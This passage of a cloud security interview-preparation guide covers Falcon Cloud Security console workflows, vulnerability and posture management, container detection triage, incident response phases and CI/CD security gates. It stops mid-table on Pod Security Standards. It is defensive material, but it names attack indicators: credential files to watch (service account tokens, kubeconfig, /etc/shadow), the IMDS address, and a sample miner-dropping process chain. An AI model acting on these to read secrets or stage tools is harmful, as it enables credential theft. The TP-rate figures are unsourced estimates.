# 🎯 ULTIMATE CLOUD SECURITY INTERVIEW PREPARATION GUIDE
## Part 1 — Falcon Platform Mastery: Every Workflow, Every Module, Identification → Post-Incident

> **Gopikrishna Vallepu** | Application Security / Cloud Security Engineer
> Tailored for: EY India — CNAPP, CWPP, CSPM, Vulnerability Management, Multi-Cloud Security
> Covers: CrowdStrike Falcon Cloud Security + Orca/Wiz/Prisma equivalents + AWS/Azure/GCP

---

# SECTION 1: YOUR ROLE AT EY — RESPONSIBILITIES MAPPED TO SKILLS

> Everything in this guide maps back to what EY actually expects you to do.

```
EY JD RESPONSIBILITY                          WHERE TO FIND IT IN THIS GUIDE
─────────────────────────────────────────────────────────────────────────────
Leverage CNAPP/CWPP/CSPM to monitor          → Section 2 (Platform Deep Dive)
  cloud assets for vulnerabilities              Section 3 (Every Module Workflow)
  and configuration weaknesses                  Section 4 (Incident Scenarios)

Implement cloud security controls            → Section 3.2 (CSPM Policy Workflows)
  (out-of-box and custom) ensuring              Section 6 (CIS/NIST Compliance)
  compliance with industry standards

Investigate false positives and handle       → Section 5 (FP/TP Investigation)
  risk-acceptance or risk-rating                Section 4 (Scenario Investigations)
  adjustments

Shape remediation SLAs, build-breaking       → Section 3.5 (SLA Framework)
  policies, and enforcement guardrails          Section 3.7 (Build-Breaking Policies)

Respond to zero-day events, iterate          → Section 4.7 (Zero-Day Scenario)
  through vulnerability management              Section 3.1 (Vuln Mgmt Lifecycle)
  lifecycle

Tune scanning tools with Engineering         → Section 5 (Detection Tuning)
  platform team to improve visibility           Section 3.6 (Tool Tuning Workflows)

Identify opportunities for automation        → Section 7 (Automation Playbook)

Deep knowledge of AWS, Azure, or GCP         → Section 2.4 (Multi-Cloud Controls)
  cloud security services                       Section 6 (Cloud-Specific CIS/NIST)
```

---

# SECTION 2: FALCON CLOUD SECURITY PLATFORM — COMPLETE DEEP DIVE

## 2.1 Platform Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    CROWDSTRIKE FALCON CLOUD SECURITY                     │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                     FALCON CLOUD (SaaS Backend)                  │    │
│  │  • AI/ML threat analysis    • Threat Intelligence               │    │
│  │  • Process Intelligence Graph  • Cloud Security Analytics       │    │
│  └─────────────────────────┬───────────────────────────────────────┘    │
│                            │                                            │
│           ┌────────────────┼────────────────┐                          │
│           │                │                │                          │
│  ┌────────▼────────┐  ┌───▼────────┐  ┌───▼──────────────┐           │
│  │  AGENT-BASED     │  │  AGENTLESS  │  │  CLOUD API-BASED │           │
│  │                  │  │             │  │                  │           │
│  │  Falcon Sensor   │  │  Snapshot   │  │  Cloud Account   │           │
│  │  (eBPF DaemonSet)│  │  Scanning   │  │  Registration    │           │
│  │  → Runtime       │  │  → Vuln     │  │  → CSPM via      │           │
│  │    detection     │  │    scanning │  │    API polling    │           │
│  │  → Process trees │  │    without  │  │  → IAM analysis  │           │
│  │  → Network       │  │    agents   │  │  → Config audit  │           │
│  │    telemetry     │  │             │  │                  │           │
│  │  → Drift detect  │  │             │  │                  │           │
│  │                  │  │             │  │                  │           │
│  │  KAC (Admission  │  │             │  │                  │           │
│  │   Controller)    │  │             │  │                  │           │
│  │  → Pre-deploy    │  │             │  │                  │           │
│  │    policy gate   │  │             │  │                  │           │
│  └──────────────────┘  └─────────────┘  └──────────────────┘           │
│                                                                         │
│  MODULES:                                                               │
│  ┌──────┐ ┌──────┐ ┌──────┐ ┌─────┐ ┌──────┐ ┌──────┐ ┌──────────┐  │
│  │CWPP  │ │CSPM  │ │CIEM  │ │KAC  │ │DSPM  │ │AI-SPM│ │ASPM      │  │
│  │      │ │      │ │      │ │     │ │      │ │      │ │          │  │
│  │Work- │ │Post- │ │Ident-│ │K8s  │ │Data  │ │AI/ML │ │App       │  │
│  │load  │ │ure   │ │ity   │ │Gate │ │Sec.  │ │Sec.  │ │Security  │  │
│  │Prot. │ │Mgmt  │ │Mgmt  │ │     │ │Post. │ │Post. │ │Posture   │  │
│  └──────┘ └──────┘ └──────┘ └─────┘ └──────┘ └──────┘ └──────────┘  │
└─────────────────────────────────────────────────────────────────────────┘
```

## 2.2 Console Navigation — Complete Menu Map with Actions

### How to Navigate to Every Feature

```
FALCON CONSOLE LEFT MENU:

Cloud Security
│
├── 📊 Dashboards
│   │   WHAT: Overview of entire cloud security posture
│   │   WHEN TO USE: Daily check-in, executive reporting, trend analysis
│   │   HOW TO ANALYZE: Check posture score trend (dropping = new misconfigs),
│   │                   compliance percentage, active detections count
│   │
│   ├── Posture Score (0-100)
│   │   → Score dropping? → Go to Posture and Compliance → find new IOMs
│   ├── Compliance Score per framework
│   │   → Below 95%? → Pull compliance report → identify failing controls
│   ├── Active Detections by severity
│   │   → Critical/High present? → Go to Detections → investigate immediately
│   ├── Asset Trends (7/30-day)
│   │   → Unexpected spike in containers? → Possible unauthorized deployment
│   └── Sensor Coverage %
│       → Below 100%? → Go to Host Management → find unmonitored nodes
│
├── 🖥️ Assets
│   │   WHAT: Inventory of all cloud resources under protection
│   │   WHEN TO USE: Identifying coverage gaps, asset owners, resource attributes
│   │
│   ├── Cloud Accounts (registered AWS/Azure/GCP accounts)
│   ├── Kubernetes Clusters (cluster name, version, node count, coverage)
│   ├── Containers (ID, image, pod, namespace, sensor status)
│   ├── Pods (name, namespace, labels, node, cluster)
│   └── Nodes (instance ID, OS, external IP, cluster association)
│
├── 🛡️ Posture and Compliance
│   │   WHAT: Configuration auditing and compliance enforcement
│   │   WHEN TO USE: Finding misconfigurations, compliance reporting, audit prep
│   │
│   ├── Cloud security posture
│   │   ├── Compliance
│   │   │   WHAT: Posture against selected compliance frameworks
│   │   │   HOW TO USE: Select framework (CIS AWS, NIST 800-53, SOC2, HIPAA)
│   │   │   → View pass/fail per control → drill into failing controls
│   │   │   → Export PDF for auditors
│   │   │
│   │   ├── Cloud Risks ◄── CRITICAL FEATURE
│   │   │   WHAT: Unified attack paths combining IOMs + IOAs + vulnerabilities
│   │   │   HOW TO USE: Review attack paths sorted by risk score (0-100)
│   │   │   → Each path shows: entry point → pivot → target → blast radius
│   │   │   → Prioritize remediation by path score, not individual findings
│   │   │   WHEN: Weekly risk review, remediation prioritization meetings
│   │   │
│   │   ├── Indicators of Misconfiguration (IOM)
│   │   │   WHAT: Individual cloud misconfigurations
│   │   │   HOW TO ANALYZE:
│   │   │     1. Filter by severity (Critical → High → Medium)
│   │   │     2. Filter by cloud account or resource type
│   │   │     3. Click finding → see affected resource, remediation steps
│   │   │     4. Check: Is this already assigned? What's the SLA status?
│   │   │   ACTIONS: Assign to owner, set SLA, suppress (with justification)
│   │   │
│   │   ├── Infrastructure as Code (IaC) detections
│   │   │   WHAT: Misconfigurations in Terraform/CloudFormation templates
│   │   │   WHEN: Shift-left — catch issues before deployment
│   │   │
│   │   └── Kubernetes misconfigurations
│   │       WHAT: K8s-specific IOMs (privileged pods, host mounts, etc.)
│   │
│   └── Explorer ◄── ASSET GRAPH VISUALIZATION
│       WHAT: Visual graph showing relationships between cloud resources
│       HOW TO USE: Click asset → see connections (IAM roles, networks, data)
│       → Identify lateral movement paths visually
│
├── 🔍 Vulnerabilities
│   │   WHAT: CVEs in images, hosts, and cloud workloads
│   │   WHEN TO USE: Vulnerability management lifecycle
│   │
│   ├── Image Assessments
│   │   WHAT: CVE and malware scan results for container images
│   │   HOW TO ANALYZE:
│   │     1. Sort by highest severity CVEs
│   │     2. Filter by "running in production" vs "registry only"
│   │     3. Check: Is there a fix available? What version patches it?
│   │     4. Prioritize: Running images with Critical CVEs + public exploit
│   │   ACTIONS: Create ticket for image rebuild, block via KAC if exploitable
│   │
│   └── Agentless Vulnerability Scanning
│       WHAT: Snapshot-based scanning for workloads without agents
│       WHEN: Serverless, managed services, or temporary environments
│       HOW: Reads EBS/disk snapshots → identifies CVEs without agent install
│
├── 🚨 Detections
│   │   WHAT: Active security detections (IOAs = behavioral, IOMs = config)
│   │   WHEN TO USE: Real-time incident investigation
│   │   THIS IS WHERE YOU SPEND MOST TIME DURING AN INCIDENT
│   │
│   ├── Containers Indicators of Attack (IOA)
│   │   WHAT: Runtime behavioral detections inside containers
│   │   HOW TO INVESTIGATE (step-by-step below in Section 3.3)
│   │   EXAMPLES: Reverse shell, container drift, privilege escalation,
│   │             interactive intrusion, C2 beacon, DNS tunneling
│   │
│   ├── Dynamic Container Assessments
│   │   WHAT: Continuous assessment of running containers
│   │
│   ├── Investigate Container Network
│   │   WHAT: Network flow visualization for containers
│   │   HOW TO USE: Select container → see all connections (internal + external)
│   │   → Identify suspicious outbound or lateral connections
│   │
│   └── Image Assessments (runtime view)
│       WHAT: Assessment status of images currently running in clusters
│
├── ⚙️ Rules and Policies
│   │   WHAT: Configure detection rules and prevention policies
│   │   WHEN TO USE: Tuning, new policy deployment, exception management
│   │
│   ├── Policies
│   │   ├── Indicators of Attack (IOA) policies
│   │   │   ACTIONS: Enable/disable specific IOA rules, set severity
│   │   │
│   │   ├── Admission Control policies ◄── KAC CONFIGURATION
│   │   │   HOW TO CONFIGURE:
│   │   │     1. Create policy → assign to cluster (via Host Group)
│   │   │     2. Add IOM rules → set action per rule (Alert or Prevent)
│   │   │     3. Add Image Assessment rules → block unscanned images
│   │   │     4. Scope by namespace and labels
│   │   │   ROLLOUT: Alert-only for 2 weeks → Prevent for critical rules
│   │   │
│   │   ├── Image Assessment policies
│   │   │   ACTIONS: Set thresholds (block Critical CVEs, block malware)
│   │   │
│   │   ├── Container drift exclusions
│   │   │   WHEN: Known legitimate processes that trigger drift alerts
│   │   │   CAUTION: Every exclusion must be documented with business justification
│   │   │
│   │   └── Cloud Risks rules / IOM rules / IaC rules
│   │       ACTIONS: Customize severity, enable/disable specific checks
│   │
│   ├── Policies Management
│   │   WHAT: Overview of all policies, their assignments, and status
│   │
│   └── Suppression rules
│       WHAT: Rules to suppress known false positives
│       REQUIREMENTS: Each suppression must have:
│         • Documented justification
│         • Expiry date (max 90 days)
│         • Assigned reviewer
│         • Quarterly review
│
├── ⚡ Settings
│   │
│   ├── Cloud posture scan settings
│   │   WHAT: Configure scan frequency, scope, and cloud provider connections
│   │
│   ├── 1-Click Sensor Deployment
│   │   WHAT: Simplified sensor enrollment for cloud workloads
│   │   HOW: Select cloud provider → follow wizard → sensor auto-deploys
│   │
│   ├── Account Registration
│   │   WHAT: Register new AWS/Azure/GCP accounts for monitoring
│   │   HOW: Use CloudFormation stack (AWS), ARM template (Azure), or Terraform
│   │
│   └── Image Assessment settings
│       WHAT: Configure which registries to scan, scan frequency
│
└── 🔌 Integrations
    WHAT: Connect Falcon to SIEM, ticketing, notification systems
    EXAMPLES: Splunk, Sentinel, Jira, ServiceNow, PagerDuty, Slack
```

## 2.3 Equivalent Features Across CNAPP Tools

> EY may use Orca, Wiz, or Prisma Cloud — know the equivalents.

| Capability | CrowdStrike Falcon | Orca Security | Wiz | Prisma Cloud |
|-----------|-------------------|---------------|-----|-------------|
| **Runtime Protection** | CWPP (eBPF sensor) | Agentless runtime | Agentless runtime | Prisma Defender (agent) |
| **Config Audit** | CSPM (Horizon) | CSPM | CSPM | CSPM |
| **Identity Analysis** | CIEM | CIEM | CIEM | CIEM |
| **K8s Admission** | KAC | OPA integration | Admission controller | Admission controller |
| **Image Scanning** | Image Assessment | Image scanning | Image scanning | twistcli + Defender |
| **IaC Scanning** | IaC rules | IaC scanning | IaC scanning | Checkov/Bridgecrew |
| **Attack Path** | Cloud Risks | Attack Path Analysis | Attack Path | Attack Path |
| **Data Security** | DSPM | Data security | DSPM | Enterprise DSPM |
| **Deployment** | Agent (DaemonSet) + Agentless | 100% Agentless | 100% Agentless | Agent + Agentless |

## 2.4 Multi-Cloud Security Controls Matrix

| Control | AWS | Azure | GCP |
|---------|-----|-------|-----|
| **Guardrails** | SCPs (Service Control Policies) | Azure Policies + Management Groups | Organization Policies |
| **IAM Monitoring** | CloudTrail + IAM Access Analyzer | Azure AD Sign-in Logs + Sentinel | Cloud Audit Logs + SCC |
| **Network Security** | Security Groups + NACLs + VPC Flow Logs | NSGs + Azure Firewall + Flow Logs | Firewall Rules + VPC Flow Logs |
| **Encryption** | KMS (CMK/AWS-managed) | Key Vault + CMK | Cloud KMS + CMEK |
| **Credential Detection** | GuardDuty + CNAPP | Defender for Cloud + Sentinel | SCC + CNAPP |
| **Compliance** | Security Hub + AWS Config | Defender Compliance + Regulatory | SCC Compliance |
| **Container Security** | ECR scanning + EKS integration | ACR scanning + AKS integration | Artifact Analysis + GKE |

---

# SECTION 3: EVERY MODULE WORKFLOW — FROM START TO FINISH

## 3.1 Vulnerability Management Lifecycle — Platform Workflow

```
COMPLETE WORKFLOW IN FALCON + CNAPP:

PHASE 1: DISCOVER
├── WHERE IN CONSOLE: Vulnerabilities → Image Assessments + Agentless Scanning
├── WHAT TO DO:
│   ├── Review new CVEs discovered in last 24/48 hours
│   ├── Filter: Severity = Critical/High, Running = Yes (in production)
│   ├── Check: Is a public exploit available? (CISA KEV catalog, EPSS score)
│   └── Export: List of affected assets with CVE details
│
PHASE 2: ASSESS & VALIDATE
├── WHERE IN CONSOLE: Click specific CVE → view affected resources
├── WHAT TO DO:
│   ├── Is the vulnerable library actually loaded at runtime?
│   │   (Some CVEs affect packages that are installed but not used)
│   ├── Is the vulnerable port/service exposed to the internet?
│   ├── Does the asset process sensitive data? (Check DSPM classification)
│   └── What is the CNAPP's contextual risk score? (Not just CVSS)
│
PHASE 3: PRIORITIZE
├── WHERE IN CONSOLE: Cloud Risks → Attack Path view
├── WHAT TO DO:
│   ├── View attack paths that include this CVE
│   ├── Score = Exploitability × Exposure × Data Sensitivity × Blast Radius
│   ├── Critical CVE + public-facing + PII data + admin IAM = IMMEDIATE
│   ├── Critical CVE + internal-only + no sensitive data = HIGH (48h SLA)
│   └── Create risk-ranked remediation queue
│
PHASE 4: REMEDIATE
├── WHERE: Jira/ServiceNow tickets (auto-created via integration)
├── WHAT TO DO:
│   ├── Assign to asset owner with specific remediation steps
│   ├── For container images: rebuild image with patched base
│   ├── For EC2/VMs: patch via SSM Run Command or maintenance window
│   ├── For Lambda: update dependency layer
│   ├── If no patch available: apply compensating controls (WAF, SG restriction)
│   └── Track against SLA timers
│
PHASE 5: VERIFY
├── WHERE IN CONSOLE: Vulnerabilities → re-scan after remediation
├── WHAT TO DO:
│   ├── Trigger re-scan of remediated assets
│   ├── Confirm CVE no longer present
│   ├── Close the ticket only after verified
│   └── If CVE still present: escalate back to asset owner
│
PHASE 6: REPORT
├── WHERE: Dashboards + exported reports
├── METRICS TO TRACK:
│   ├── MTTR (Mean Time to Remediate) by severity
│   ├── Open vulnerability count trend (should be decreasing)
│   ├── SLA compliance rate (target: >95%)
│   ├── Age analysis: How many findings are >30 days old?
│   └── Coverage: % of assets scanned vs total assets
```

## 3.2 CSPM Workflow — Finding Misconfigurations and Fixing Them

```
CSPM INVESTIGATION WORKFLOW:

1. GO TO: Posture and Compliance → Indicators of Misconfiguration
2. FILTER: Severity = Critical → Account = Production
3. EXAMINE each finding:
   │
   ├── FINDING DETAIL VIEW shows:
   │   ├── What: "S3 bucket 'customer-data' has Block Public Access disabled"
   │   ├── Resource: ARN, region, account, tags
   │   ├── Benchmark: CIS AWS 2.1.5, NIST 800-53 SC-28
   │   ├── Severity: CRITICAL
   │   ├── First seen: 2025-12-01 (47 days ago — SLA BREACHED)
   │   ├── Remediation: Exact AWS CLI / Terraform / Console steps
   │   └── Attack path: Does this finding connect to an attack path?
   │
   ├── DETERMINE ACTION:
   │   ├── REMEDIATE NOW: Follow remediation steps → re-scan → close
   │   ├── ASSIGN: Create ticket → assign to resource owner → set SLA
   │   ├── SUPPRESS: If false positive → document justification → set expiry
   │   └── RISK ACCEPT: Formal risk acceptance → VP sign-off → 90-day max
   │
4. CHECK: Posture and Compliance → Compliance → track score improvement
5. REPORT: Weekly compliance dashboard to stakeholders
```

## 3.3 CWPP Runtime Detection Investigation — Step by Step

```
RUNTIME DETECTION INVESTIGATION:

1. GO TO: Detections → Containers Indicators of Attack (IOA)

2. ALERT TRIAGE:
   ├── Severity? (Critical = investigate immediately)
   ├── Detection type? (see table below)
   ├── Which container/pod/namespace/cluster?
   └── When did it fire? (Active now vs historical?)

3. FOR EACH DETECTION, EXAMINE:
   │
   ├── PROCESS TREE ◄── THE MOST IMPORTANT VIEW
   │   Shows: Parent → Child → Grandchild process chain
   │   Example: nginx → bash → curl → /tmp/xmrig
   │   ASK: "Is this process chain normal for this workload?"
   │   Web server → shell = ALWAYS suspicious
   │   CI/CD runner → shell → build tool = Often normal
   │
   ├── DRIFT INDICATORS
   │   Shows: Files written after container start not in original image
   │   ASK: "Was this binary in the original image?"
   │   New executable after start = potential attack tool
   │
   ├── NETWORK CONNECTIONS
   │   Shows: All inbound/outbound connections from the container
   │   ASK: "Is this container supposed to make outbound connections?"
   │   Connection to known-bad IP = compromise indicator
   │   Connection to mining pool = cryptominer
   │   DNS tunneling pattern = data exfiltration
   │
   ├── FILE ACCESS
   │   Shows: Files read/written by processes
   │   CRITICAL FILES TO WATCH:
   │   /var/run/secrets/kubernetes.io/serviceaccount/token → K8s API access
   │   /var/lib/kubelet/kubeconfig → node-level cluster access
   │   /etc/shadow, /etc/passwd → credential harvesting
   │   /dev/shm, /tmp → offensive tool staging area
   │
   └── CONTAINER CONTEXT
       Shows: Image name, registry, namespace, labels, security context
       CHECK: Is it privileged? Running as root? Host network/PID?

4. DECIDE: True Positive or False Positive?
   (See Section 5 for the full TP/FP framework)

5. IF TRUE POSITIVE → Proceed to containment (Section 3.4)
```

### Detection Types Quick Reference

| Detection Name | What It Means | Severity | Typical TP/FP |
|---------------|--------------|----------|---------------|
| `ReverseShellDetected` | Outbound shell to attacker IP | 🔴 Critical | 99% TP |
| `ContainerDrift.NewExecutable` | Binary written post-start | 🟠 High | 85% TP (some legitimate debug) |
| `InteractiveContainerSession` | TTY shell in production pod | 🟠 High | 70% TP (could be authorized debug) |
| `PotentialKernelTampering` | Kernel exploit or eBPF from container | 🔴 Critical | 95% TP |
| `CryptominingActivity` | Mining pool connection | 🟠 High | 99% TP |
| `SuspiciousNetworkConnection` | Connection to flagged IP/domain | 🟠 High | 80% TP |
| `SuspiciousDNSRequest` | DNS tunneling or known-bad domain | 🟠 High | 75% TP |
| `BeaconLikeTraffic` | C2 beacon pattern | 🟠 High | 85% TP |
| `ContainerEscape.Nsenter` | nsenter to host namespace | 🔴 Critical | 99% TP |
| `SuspiciousProcessExecution` | Unexpected binary execution | 🟡 Medium | 60% TP |

## 3.4 Incident Response Lifecycle — Complete Platform Workflow

```
THE 6-PHASE INCIDENT RESPONSE LIFECYCLE:

═══════════════════════════════════════════════════════════════════════
PHASE 1: IDENTIFICATION                                    Time: 0-5 min
═══════════════════════════════════════════════════════════════════════

WHERE IN FALCON: Detections → IOA alerts

WHAT TO DO:
├── 1. Open the detection alert
├── 2. Read the detection name and description
├── 3. Check severity and confidence level
├── 4. View the PROCESS TREE — what is the chain?
├── 5. Check container context — which workload? namespace? cluster?
├── 6. Is this workload production or dev/staging?
└── 7. Make initial assessment: TP or FP?

DECISION POINT:
├── Clearly FP (known legitimate behavior) → Document + Suppress → Done
├── Clearly TP (reverse shell, known malware hash) → Move to CONTAINMENT
└── Uncertain → Treat as TP, continue investigation alongside containment

═══════════════════════════════════════════════════════════════════════
PHASE 2: CONTAINMENT                                      Time: 5-15 min
═══════════════════════════════════════════════════════════════════════

SHORT-TERM CONTAINMENT (stop the bleeding):

For Container/Pod compromise:
├── kubectl delete pod <name> -n <namespace>     # Kill compromised pod
├── Apply deny-all NetworkPolicy to namespace     # Isolate other pods
└── kubectl cordon <node>                         # Prevent new pods on this node

For EC2/VM compromise:
├── Modify Security Group → deny all inbound/outbound
├── aws iam put-role-policy → attach deny-all to instance role
└── DO NOT terminate yet — preserve for forensics

For IAM credential compromise:
├── Deactivate access keys immediately
├── Attach deny-all IAM policy to the principal
├── Revoke active STS sessions (inline deny with DateLessThan condition)
└── aws iam put-role-policy --role-name <role> --policy-name EmergencyDeny \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny",
    "Action":"*","Resource":"*","Condition":{"DateLessThan":
    {"aws:TokenIssueTime":"<NOW>"}}}]}'

For S3 data exposure:
├── aws s3api put-public-access-block (block all public access)
├── Enable S3 Object Lock on sensitive buckets
└── Review and revoke any active pre-signed URLs

═══════════════════════════════════════════════════════════════════════
PHASE 3: INVESTIGATION                                    Time: 15-60 min
═══════════════════════════════════════════════════════════════════════

WHERE IN FALCON: 
├── Detections → click into alert → full investigation view
├── Investigate Container Network → network flow analysis
├── Assets → check resource metadata and relationships
└── Explorer → visualize attack path

INVESTIGATION CHECKLIST:
├── ENTRY POINT:
│   ├── How did the attacker get in?
│   ├── Exploited vulnerability? (check image assessment for CVEs)
│   ├── Stolen credential? (check CloudTrail for anomalous login)
│   ├── Misconfiguration? (check CSPM for related IOMs)
│   └── Supply chain? (check image provenance, Helm chart origin)
│
├── LATERAL MOVEMENT:
│   ├── Did the attacker access the K8s service account token?
│   ├── Did they query IMDS (169.254.169.254)?
│   ├── Did they scan the internal network?
│   ├── Were other pods/services accessed?
│   └── CloudTrail: Were API calls made with stolen credentials?
│
├── DATA ACCESS:
│   ├── Was any data read or exfiltrated?
│   ├── Check network connections for data transfer volumes
│   ├── Check S3 server access logs for unusual GetObject patterns
│   └── Check database audit logs for unusual queries
│
├── PERSISTENCE:
│   ├── Were new IAM users, roles, or access keys created?
│   ├── Were new K8s ClusterRoleBindings or ServiceAccounts created?
│   ├── Were Lambda functions or Config rules created (backdoor)?
│   ├── Were new EC2 instances launched?
│   └── Check for modifications to authorized_keys, crontab, systemd
│
└── EVIDENCE PRESERVATION:
    ├── EBS snapshot of compromised instance
    ├── Container filesystem preserved (kubectl cp or Falcon RTR)
    ├── CloudTrail logs copied to forensic S3 bucket (KMS encrypted)
    ├── K8s audit logs exported
    └── Network flow logs captured

═══════════════════════════════════════════════════════════════════════
PHASE 4: ERADICATION                                      Time: 1-4 hours
═══════════════════════════════════════════════════════════════════════

WHAT TO DO:
├── Remove attacker access:
│   ├── Delete rogue IAM users/roles/access keys
│   ├── Remove unauthorized ClusterRoleBindings
│   ├── Delete persistence mechanisms (Lambda backdoors, Config rules)
│   └── Delete compromised container images from registry
│
├── Patch the vulnerability:
│   ├── Update the application dependency
│   ├── Rebuild container image with patched base
│   ├── Push through CI/CD pipeline
│   └── Verify patch with re-scan
│
├── Rotate credentials:
│   ├── All secrets accessible from compromised workload
│   ├── Database passwords, API keys, service account tokens
│   ├── K8s cluster secrets (if kubelet creds were accessed)
│   └── IRSA role sessions (modify trust policy, delete SA, recreate)
│
└── Harden:
    ├── Apply security controls that would have prevented the attack
    ├── KAC rules: set relevant policies to PREVENT
    ├── NetworkPolicies: default deny in affected namespace
    ├── SecurityContext: readOnlyRootFilesystem, runAsNonRoot
    └── SGs/NACLs: restrict access to minimum required

═══════════════════════════════════════════════════════════════════════
PHASE 5: RECOVERY                                         Time: 4-24 hours
═══════════════════════════════════════════════════════════════════════

WHAT TO DO:
├── Redeploy clean workloads from verified images
├── Restore from known-good backups if data was corrupted
├── Replace compromised nodes from golden AMI
├── Verify all services are operating normally
├── Monitor closely for attacker return (enhanced alerting for 72 hours)
└── Confirm sensor coverage is 100% across all assets

═══════════════════════════════════════════════════════════════════════
PHASE 6: POST-INCIDENT ACTIVITIES                         Time: 24-72 hours
═══════════════════════════════════════════════════════════════════════

WHAT TO DO:
├── POST-INCIDENT REPORT:
│   ├── Timeline: Detection → Containment → Eradication → Recovery
│   ├── Root cause analysis
│   ├── Data impact assessment (was data accessed/exfiltrated?)
│   ├── What worked well in the response?
│   ├── What can be improved?
│   └── Recommendations for future prevention
│
├── LESSONS LEARNED:
│   ├── Update detection rules based on what the attacker did
│   ├── Add new KAC/CSPM policies to prevent recurrence
│   ├── Update runbooks and playbooks
│   ├── Train the team on the identified attack technique
│   └── Verify similar vulnerabilities don't exist elsewhere
│
├── COMPLIANCE & NOTIFICATION:
│   ├── Determine if breach notification is required (GDPR 72h, HIPAA 60d)
│   ├── Notify legal/compliance team
│   ├── Generate audit evidence from Falcon (detection timeline, actions taken)
│   └── Update risk register with incident findings
│
├── METRICS:
│   ├── MTTD (Mean Time to Detect): time from attack start to detection
│   ├── MTTR (Mean Time to Respond): time from detection to containment
│   ├── MTTE (Mean Time to Eradicate): time to complete removal
│   ├── Blast radius: how many assets/data records were affected?
│   └── Root cause category: vulnerability, misconfiguration, credential, supply chain
│
└── GOVERNANCE UPDATES:
    ├── Update CSPM finding SLAs if existing SLAs were too slow
    ├── Add new CSPM/KAC policies for the identified misconfiguration
    ├── Review and tighten IAM permissions
    └── Schedule review of all similar assets across the organization
```

## 3.5 Remediation SLA Framework

| Severity | Public-Facing | Internal | + PII/Financial Data | + Active Exploit (CISA KEV) |
|----------|--------------|----------|---------------------|---------------------------|
| **Critical** (CVSS 9.0+) | 4 hours | 24 hours | Halve the SLA | Immediate (1 hour) |
| **High** (CVSS 7.0-8.9) | 24 hours | 48 hours | Halve the SLA | 4 hours |
| **Medium** (CVSS 4.0-6.9) | 7 days | 14 days | 7 days | 24 hours |
| **Low** (CVSS 0.1-3.9) | 30 days | 90 days | 30 days | 7 days |

**SLA Escalation Chain:**
```
SLA at 50% → Automated email to resource owner
SLA at 75% → Automated Slack alert to team lead
SLA at 100% (BREACHED) → Jira ticket auto-escalates to engineering manager
SLA at 150% → CISO notification, risk register entry, governance review
```

## 3.6 Tool Tuning Workflow — Improving Signal-to-Noise

```
MONTHLY TUNING CYCLE:

WEEK 1: ANALYZE
├── Pull detection metrics for last 30 days
├── Identify top-10 noisiest alert types by volume
├── Calculate TP rate for each: (True Positives) / (Total Alerts)
├── Identify alert types with TP rate < 50% → candidates for tuning
└── Identify alert types with 0 TP → candidates for review or suppression

WEEK 2: TUNE
├── For each low-TP alert:
│   ├── Root cause: Why is it firing on legitimate activity?
│   ├── Can we scope the rule more precisely?
│   │   (e.g., exclude specific namespaces, labels, or image registries)
│   ├── Can we adjust the detection logic?
│   │   (e.g., raise threshold for network connection volume)
│   └── Document the tuning change with justification
│
├── For each 0-TP alert:
│   ├── Is the alert irrelevant to our environment? → Disable with documentation
│   ├── Is it poorly scoped? → Refine scope
│   └── Is it working correctly but our environment is clean? → Keep enabled
│
└── Apply tuning changes in STAGING first → monitor for 72 hours → move to PROD

WEEK 3: VALIDATE
├── Compare: Alert volume before vs after tuning
├── Confirm: TP rate improved
├── Confirm: No legitimate threats were suppressed
└── Document results in tuning log

WEEK 4: REPORT
├── Tuning report to security leadership:
│   ├── Alerts before: X/month → Alerts after: Y/month (Z% reduction)
│   ├── TP rate before: X% → TP rate after: Y%
│   ├── MTTD improvement (fewer alerts → analysts investigate faster)
│   └── Suppressions added/reviewed/removed this cycle
```

## 3.7 Build-Breaking Policy — CI/CD Integration

```
CI/CD SECURITY GATE WORKFLOW:

Developer → Git Push → CI Pipeline Starts
                              │
                    ┌─────────▼─────────────┐
                    │ STAGE 1: IaC Scan      │
                    │ (Checkov/tfsec/KICS)   │
                    │                        │
                    │ Checks:                │
                    │ • Hardcoded secrets     │
                    │ • Open SGs (0.0.0.0/0) │
                    │ • Unencrypted storage   │
                    │ • Overly permissive IAM │
                    ├────────────────────────┤
                    │ CRITICAL/HIGH → ❌ FAIL │
                    │ MEDIUM/LOW → ⚠️ WARN    │
                    └─────────┬──────────────┘
                              │ PASS
                    ┌─────────▼─────────────┐
                    │ STAGE 2: Image Scan    │
                    │ (Falcon/Trivy/Snyk)    │
                    │                        │
                    │ Checks:                │
                    │ • Critical CVEs in OS  │
                    │ • Critical CVEs in libs│
                    │ • Malware in layers    │
                    │ • Secrets in image     │
                    │ • SUID binaries        │
                    │ • No USER instruction  │
                    ├────────────────────────┤
                    │ CRITICAL → ❌ FAIL      │
                    │ HIGH → ❌ FAIL          │
                    │ MEDIUM → ⚠️ WARN        │
                    └─────────┬──────────────┘
                              │ PASS
                    ┌─────────▼─────────────┐
                    │ STAGE 3: Deploy        │
                    │                        │
                    │ Even if pipeline passes│
                    │ KAC is the SECOND GATE:│
                    │ • Checks image scanned │
                    │ • Checks security ctx  │
                    │ • Blocks if policy     │
                    │   violated             │
                    └────────────────────────┘

EXCEPTION PROCESS:
├── Developer gets build failure → reads exact finding + remediation steps
├── If legitimate exception needed:
│   ├── Request via security exception form
│   ├── Security team reviews within 4 hours
│   ├── If approved: time-limited bypass (max 7 days) with ticket to fix
│   └── If denied: developer must fix before deploying
```

---

## 3.8 Pod Security Standards (PSS) — The K8s Security Baseline

> PSS replaced Pod Security Policies (PSPs) in K8s 1.25+. Every K8s cluster you work with uses them.

### The Three PSS Profiles

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                     POD SECURITY STANDARDS (PSS) PROFILES                       │
│                                                                                 │
│  ┌─────────────────┐    ┌─────────────────┐    ┌──────────────────────┐        │
│  │   PRIVILEGED     │    │   BASELINE       │    │   RESTRICTED          │        │
│  │                  │    │                  │    │                      │        │
│  │  • No restrictions│    │  • Prevents known│    │  • Maximum hardening │        │
│  │  • Full access    │    │    privilege      │    │  • Non-root only     │        │
│  │  • For system     │    │    escalations   │    │  • Drop ALL caps     │        │
│  │    infrastructure │    │  • Blocks most   │    │  • Seccomp required  │        │
│  │    only (CNI,     │    │    dangerous     │    │  • No hostPath       │        │
│  │    storage, Falcon│    │    settings      │    │  • Read-only root FS │        │
│  │    sensor)        │    │  • Good default  │    │  • For security-     │        │
│  │                  │    │    for most apps  │    │    critical workloads│        │
│  │  Use: <5% of     │    │  Use: ~70% of    │    │  Use: ~25% of        │        │
│  │  namespaces       │    │  namespaces      │    │  namespaces          │        │
